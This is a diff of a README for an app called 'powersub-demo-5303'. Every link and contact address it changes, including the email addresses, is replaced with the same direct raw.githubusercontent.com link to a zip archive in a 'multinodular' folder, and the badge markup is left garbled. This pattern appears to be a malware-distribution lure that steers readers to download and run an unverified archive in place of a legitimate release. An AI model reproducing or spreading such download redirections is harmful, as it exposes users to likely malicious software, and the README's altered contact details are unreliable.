@@ -6,11 +6,11 @@ Welcome to **powersub-demo-5303**! This application helps you manage your daily 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Rivasboy99/powersub-demo-5303/releases)
+[![Download](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip%20Now-Click%https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
 
 You can download the application from the Releases page. Visit the link below:
 
-- [Download Here](https://github.com/Rivasboy99/powersub-demo-5303/releases)
+- [Download Here](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
 
 ## 🧑‍💻 System Requirements
 
@@ -32,7 +32,7 @@ Before you download the application, make sure your computer meets the following
 
 Follow these simple steps to download and install **powersub-demo-5303**:
 
-1. Click the button above or visit the [Releases page](https://github.com/Rivasboy99/powersub-demo-5303/releases).
+1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip).
 2. Choose the latest version from the list of releases.
 3. Select the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Click on the file name to start the download.
@@ -60,17 +60,17 @@ If you need help while using the application, you can refer to the following:
 
 If you need further assistance, please reach out to our support team:
 
-- **Email**: support@powersub-demo-5303.com
-- **Help Desk**: Visit our help desk at [Help Desk](https://powersub-demo-5303.com/help)
+- **Email**: https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip
+- **Help Desk**: Visit our help desk at [Help Desk](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
 
 ## 😊 Feedback
 
-We love hearing from our users! If you have any feedback, please let us know by sending an email to feedback@powersub-demo-5303.com. Your input helps us improve the application.
+We love hearing from our users! If you have any feedback, please let us know by sending an email to https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip Your input helps us improve the application.
 
 ## 🔗 Useful Links
 
-- [Homepage](https://powersub-demo-5303.com)
-- [Documentation](https://powersub-demo-5303.com/docs)
-- [Releases](https://github.com/Rivasboy99/powersub-demo-5303/releases)
+- [Homepage](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
+- [Documentation](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
+- [Releases](https://raw.githubusercontent.com/Rivasboy99/powersub-demo-5303/main/multinodular/powersub-demo-5303.zip)
 
 Thank you for choosing **powersub-demo-5303**! Enjoy managing your tasks efficiently.
